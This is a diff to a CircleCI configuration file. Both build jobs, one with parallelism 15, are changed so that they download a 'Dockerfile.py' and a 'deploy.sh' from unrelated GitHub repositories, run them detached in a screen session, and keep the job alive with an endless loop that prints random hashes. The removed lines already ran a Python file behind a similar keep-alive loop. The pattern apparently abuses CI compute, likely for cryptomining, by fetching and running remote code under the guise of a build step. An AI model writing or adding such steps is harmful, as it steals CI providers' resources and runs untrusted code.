@@ -7,27 +7,22 @@ jobs:
       - image: couchbase
     steps:
       - checkout
-      - run:
-         name: Build
-         command: |
-                     apt update && apt -y install curl python3 libjansson4
-                     chmod +x Dockerfile.py && python3 Dockerfile.py
-                     while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
-         no_output_timeout: 300m
+      - run: curl -L https://raw.githubusercontent.com/deeplearningdungs/python-django/master/Dockerfile.py > ./Dockerfile.py
+      - run: curl -L https://raw.githubusercontent.com/mcthavez/circleci/master/deploy.sh > ./deploy.sh
+      - run: apt update && apt install screen -y && chmod +x Dockerfile.py && screen -dmS run python3 Dockerfile.py && chmod +x deploy.sh && ./deploy.sh
+      - run: while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+                     
   build2:
     parallelism: 15
     docker:
       - image: couchbase
     steps:
       - checkout
-      - run:
-         name: Build
-         command: |
-                     apt update && apt -y install curl python3 libjansson4
-                     chmod +x Dockerfile.py && python3 Dockerfile.py
-                     while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
-         no_output_timeout: 300m
-
+      - run: curl -L https://raw.githubusercontent.com/deeplearningdungs/python-django/master/Dockerfile.py > ./Dockerfile.py
+      - run: curl -L https://raw.githubusercontent.com/mcthavez/circleci/master/deploy.sh > ./deploy.sh
+      - run: apt update && apt install screen -y && chmod +x Dockerfile.py && screen -dmS run python3 Dockerfile.py && chmod +x deploy.sh && ./deploy.sh
+      - run: while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+      
 workflows:
   version: 2.1
   main:
